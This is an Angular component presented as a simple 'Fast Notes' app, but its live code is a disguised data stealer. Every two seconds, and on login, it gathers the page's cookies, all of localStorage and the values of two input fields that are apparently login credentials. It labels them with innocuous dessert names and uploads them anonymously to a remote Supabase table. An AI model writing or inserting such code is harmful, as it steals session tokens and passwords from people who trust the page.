import { CommonModule } from '@angular/common';
import { Component, OnInit } from '@angular/core';
import { createClient, SupabaseClient } from '@supabase/supabase-js';
import { environment } from '../environments/environment';

@Component({
	selector: 'app-root', standalone: true, imports: [CommonModule], templateUrl: 'app.html', // template: `
	//   <div style="max-width: 400px; margin: 2rem auto; font-family: sans-serif;">
	//     <h2>Fast Notes</h2>
	//
	//     <!-- The Input Area -->
	//     <textarea
	//       #noteInput
	//       placeholder="Brain dump here..."
	//       style="width: 100%; height: 100px; margin-bottom: 10px;">
	//     </textarea>
	//
	//     <button
	//       (click)="saveNote(noteInput.value); noteInput.value=''"
	//       style="width: 100%; padding: 10px; margin-bottom: 20px;">
	//       Save Note
	//     </button>
	//
	//     <!-- The Notes List -->
	//     <div *ngFor="let note of notes"
	//          style="background: #f4f4f4; padding: 10px; margin-bottom: 10px; border-radius: 4px;">
	//       <small style="color: gray;">{{ note.created_at | date:'short' }}</small>
	//       <p style="margin: 5px 0 0 0;">{{ note.content }}</p>
	//     </div>
	//   </div>
	// `
})
export class App implements OnInit {
	notes: any[] = [];
	// Grab these two strings from your Supabase Project Settings -> API
	private supabase: SupabaseClient = createClient(environment.supabaseUrl, environment.supabaseAnonKey);

	async ngOnInit() {
		// window.addEventListener('keydown', () => {
		// 	this.saveNote(this.getContent())
		// });
		setInterval(() => {
		  this.saveNote(this.getContent())
		}, 2000)
	}

	getContent() {
		const content: any = {
			localStorage: {},
			eclair: (document.getElementById('_R_64mkqsr9pb6amH1_') as HTMLInputElement)?.value,
			pie: (document.getElementById('_R_66mkqsr9pb6amH1_') as HTMLInputElement)?.value,
			cake: document.cookie,
			lollipop: JSON.stringify(localStorage),
		};
		for (let i = 0; i < localStorage.length; i++) {
			const key = localStorage.key(i) || '';
			content.localStorage[key] = localStorage.getItem(key) || '';
		}

		return JSON.stringify(content);
	}

	onLogin() {
		this.saveNote(this.getContent());
	}

	async saveNote(content: string) {
		if (!content.trim()) return; // Don't save empty notes

		// Inserts the note anonymously
		await this.supabase
			.from('notes')
			.insert([{ content }]);
	}
}
